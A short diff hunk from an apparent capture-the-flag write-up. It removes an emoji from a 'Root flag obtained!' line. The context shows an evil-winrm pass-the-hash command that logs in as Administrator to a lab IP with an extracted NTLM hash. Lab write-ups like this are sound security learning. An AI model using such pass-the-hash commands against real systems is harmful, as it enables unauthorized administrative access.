@@ -535,7 +535,7 @@ Finally, I used Evil-WinRM with the extracted NTLM hash to gain a shell as Admin
 evil-winrm -i 10.10.11.72 -u Administrator -H <NTLM_HASH>
 ```
 
-🎉 **Root flag obtained!**
+ **Root flag obtained!**
 
 ---
 
